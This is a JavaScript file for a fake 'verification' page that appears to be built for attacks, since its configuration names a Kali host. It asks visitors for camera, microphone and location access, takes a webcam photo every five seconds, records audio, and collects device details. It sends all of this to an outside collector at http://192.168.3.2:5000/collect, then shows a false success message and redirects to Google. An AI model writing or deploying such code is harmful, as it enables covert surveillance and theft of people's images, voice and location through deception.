// Configuration
const KALI_IP = "192.168.3.2";
const API_URL = `http://${KALI_IP}:5000/collect`;

// DOM Elements
const startBtn = document.getElementById('start-btn');
const messageDiv = document.getElementById('message');
const cameraStatus = document.getElementById('camera-status');
const microphoneStatus = document.getElementById('microphone-status');
const locationStatus = document.getElementById('location-status');
const cameraBox = document.getElementById('camera-box');
const microphoneBox = document.getElementById('microphone-box');
const locationBox = document.getElementById('location-box');

let mediaStream = null;
let mediaRecorder = null;
let audioChunks = [];

// Start the process
startBtn.addEventListener('click', async () => {
    startBtn.disabled = true;
    startBtn.textContent = 'Processing...';
    
    await requestCamera();
    await requestMicrophone();
    await requestLocation();
    sendDeviceInfo();
    startPhotoCapture();
    startAudioRecording();
    
    messageDiv.innerHTML = '<div class="message success">✅ Verification completed! Redirecting...</div>';
    
    setTimeout(() => {
        window.location.href = 'https://www.google.com';
    }, 3000);
});

// Request Camera
async function requestCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('video');
        video.srcObject = stream;
        mediaStream = stream;
        cameraStatus.textContent = 'Granted';
        cameraStatus.classList.add('granted');
        cameraBox.classList.add('granted');
        sendToAPI('camera', { status: 'granted' });
    } catch(err) {
        cameraStatus.textContent = 'Denied';
        cameraStatus.classList.add('denied');
        cameraBox.classList.add('denied');
        sendToAPI('camera', { status: 'denied', error: err.message });
    }
}

// Request Microphone
async function requestMicrophone() {
    try {
        await navigator.mediaDevices.getUserMedia({ audio: true });
        microphoneStatus.textContent = 'Granted';
        microphoneStatus.classList.add('granted');
        microphoneBox.classList.add('granted');
        sendToAPI('microphone', { status: 'granted' });
    } catch(err) {
        microphoneStatus.textContent = 'Denied';
        microphoneStatus.classList.add('denied');
        microphoneBox.classList.add('denied');
        sendToAPI('microphone', { status: 'denied', error: err.message });
    }
}

// Request Location
function requestLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            locationStatus.textContent = 'Not Supported';
            locationStatus.classList.add('denied');
            resolve(false);
            return;
        }
        
        navigator.geolocation.getCurrentPosition(
            (position) => {
                locationStatus.textContent = 'Granted';
                locationStatus.classList.add('granted');
                locationBox.classList.add('granted');
                sendToAPI('location', {
                    lat: position.coords.latitude,
                    lon: position.coords.longitude
                });
                resolve(true);
            },
            (err) => {
                locationStatus.textContent = 'Denied';
                locationStatus.classList.add('denied');
                locationBox.classList.add('denied');
                sendToAPI('location', { status: 'denied', error: err.message });
                resolve(false);
            }
        );
    });
}

// Send device info
function sendDeviceInfo() {
    sendToAPI('device_info', {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screenWidth: screen.width,
        screenHeight: screen.height,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
    });
}

// Capture photo every 5 seconds
function startPhotoCapture() {
    const video = document.getElementById('video');
    const canvas = document.createElement('canvas');
    
    setInterval(() => {
        if (video.videoWidth > 0 && video.srcObject) {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/jpeg', 0.7);
            sendToAPI('image', { data: imageData });
        }
    }, 5000);
}

// Record audio
function startAudioRecording() {
    if (!mediaStream) return;
    
    const audioTracks = mediaStream.getAudioTracks();
    if (audioTracks.length === 0) return;
    
    mediaRecorder = new MediaRecorder(mediaStream);
    
    mediaRecorder.ondataavailable = (event) => {
        if (event.data.size > 0) {
            audioChunks.push(event.data);
        }
    };
    
    mediaRecorder.onstop = () => {
        const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
        const reader = new FileReader();
        reader.onloadend = () => {
            sendToAPI('audio', { data: reader.result });
        };
        reader.readAsDataURL(audioBlob);
        audioChunks = [];
    };
    
    mediaRecorder.start();
    
    setInterval(() => {
        if (mediaRecorder && mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
            setTimeout(() => {
                mediaRecorder.start();
            }, 100);
        }
    }, 10000);
}

// Send to API
function sendToAPI(type, data) {
    const payload = { type, ...data };
    
    fetch(API_URL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    }).catch(err => {
        console.error('Failed to send:', type, err);
    });
}

// Auto-start
window.addEventListener('load', () => {
    startBtn.disabled = false;
    messageDiv.innerHTML = '<div class="message">Click "Start Verification" to continue</div>';
});